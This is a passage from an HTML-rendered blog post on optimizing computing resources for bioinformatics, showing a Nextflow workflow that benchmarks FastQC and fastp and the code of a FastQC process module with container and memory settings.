24%)"><span class="token plain">include </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> FASTQC as FASTQC_3 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"> from </span><span class="token string" style="color:hsl(119, 34%, 47%)">'./modules/fastqc.nf'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">include </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> FASTP as FASTP_1 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"> from </span><span class="token string" style="color:hsl(119, 34%, 47%)">'./modules/fastp.nf'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">include </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> FASTP as FASTP_2 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"> from </span><span class="token string" style="color:hsl(119, 34%, 47%)">'./modules/fastp.nf'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">include </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> FASTP as FASTP_3 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"> from </span><span class="token string" style="color:hsl(119, 34%, 47%)">'./modules/fastp.nf'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">// Parse CSV</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> skip header, </span><span class="token function" style="color:hsl(221, 87%, 60%)">split</span><span class="token plain"> by comma, </span><span class="token function" style="color:hsl(221, 87%, 60%)">expand</span><span class="token plain"> to tuple </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> process</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Channel</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    .fromPath</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">params.input</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    .splitCsv</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">header:true</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    .map </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> row -</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        // Compose the meta map and reads list</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        def meta </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> id: row.sample, strandedness: row.strandedness </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        def reads </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> row.fastq_1, row.fastq_2 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        tuple</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta, reads</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    .set </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> sample_ch </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">workflow </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">params.run_fastqc</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        // fastqc benchmarks</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        FASTQC_1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">sample_ch</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        FASTQC_2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">sample_ch</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        FASTQC_3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">sample_ch</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">params.run_fastp</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        // fastp benchmarks</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        FASTP_1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">sample_ch,</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain">, false, false, </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">false</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        FASTP_2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">sample_ch,</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain">, false, false, </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">false</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        FASTP_3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">sample_ch,</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain">, false, false, </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">false</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="modules">Modules<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1#modules" class="hash-link" aria-label="Direct link to Modules" title="Direct link to Modules" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="fastqc">FastQC<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1#fastqc" class="hash-link" aria-label="Direct link to FastQC" title="Direct link to FastQC" translate="no">​</a></h3>
<p>This module uses containers to run FastQC with configurable resources.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process FASTQC </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tag </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${meta.id}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    label </span><span class="token string" style="color:hsl(119, 34%, 47%)">'process_medium'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    conda </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${moduleDir}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/environment.yml"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    container </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${ workflow.containerEngine == 'singularity' &amp;&amp; </span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">task.ext.singularity_pull_docker_container ?</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string variable" style="color:hsl(221, 87%, 60%)">        'https</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">:</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">depot.galaxyproject.org</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">singularity</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">fastqc</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">:</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">0.12.1--hdfd78af_0' </span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">:</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string variable" style="color:hsl(221, 87%, 60%)">        'biocontainers</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">fastqc</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">:</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">0.12.1--hdfd78af_0' }</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">reads</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    output:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"*.html"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, emit: html</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"*.zip"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> , emit: </span><span class="token function" style="color:hsl(221, 87%, 60%)">zip</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path  </span><span class="token string" style="color:hsl(119, 34%, 47%)">"versions.yml"</span><span class="token plain">           , emit: versions</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    when:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    task.ext.when </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> null </span><span class="token operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token plain"> task.ext.when</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    script:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def args          </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task.ext.args ?: </span><span class="token string" style="color:hsl(119, 34%, 47%)">''</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def prefix        </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task.ext.prefix ?: </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${meta.id}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    // Make list of old name and new name pairs to use </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:hsl(221, 87%, 60%)">renaming</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> the </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">while</span><span class="token plain"> loop</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def old_new_pairs </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> reads instanceof Path </span><span class="token operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token plain"> reads.size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"> ? </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> reads, </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${reads.extension}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> reads.withIndex</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">.collect </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> entry, index -</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> entry, </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">_</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${index + 1}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${entry.extension}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def rename_to     </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> old_new_pairs*.join</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">' '</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">.join</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">' '</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def renamed_files </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> old_new_pairs.collect</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> _old_name, new_name -</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> new_name </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain">.join</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">' '</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    // The total amount of allocated RAM by FastQC equals the number of threads defined </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">--threads</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">times</span><span class="token plain"> the amount of RAM defined </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">--memory</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    // https://github.com/s-andrews/FastQC/blob/1faeea0412093224d7f6a07f777fad60a5650795/fastqc</span><span class="token comment" style="color:hsl(230, 4%, 64%)">#L211-L222</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    // Dividing task.memory by task.cpus allows us to stick to the requested amount of RAM </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> the label</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def memory_in_mb </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task.memory ? task.memory.toUnit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">'MB'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> / task.cpus </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> null</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    // FastQC memory value allowed range </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">100</span><span class="token plain"> - </span><span class="token number" style="color:hsl(35, 99%, 36%)">10000</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def fastqc_memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> memory_in_mb </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">10000</span><span class="token plain"> ? </span><span class="token number" style="color:hsl(35, 99%, 36%)">10000</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">memory_in_mb </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">100</span><span class="token plain"> ? </span><span class="token number" style="color:hsl(35, 99%, 36%)">100</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> memory_in_mb</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">printf</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"%s %s</span><span class="token string entity" style="color:hsl(230, 8%, 24%)">\\</span><span class="token string" style="color:hsl(119, 34%, 47%)">n"</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${rename_to}</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">while</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">read</span><span class="token plain"> old_name new_name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"\</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${new_name}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">ln</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-s</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$old_name</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$new_name</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    fastqc </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${args}</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--threads</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${task.cpus}</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--memory</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${fastqc_memory}</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${renamed_files}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;-</span><span class="token plain">END_VERSIONS </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> versions.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${task.process}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        fastqc: </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> fastqc </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">sed</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">'/FastQC v/!d; s/.*v//'</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    END_VERSIONS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    stub:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def prefix </span><span class="token operator" style="color:hsl(221, 87%, 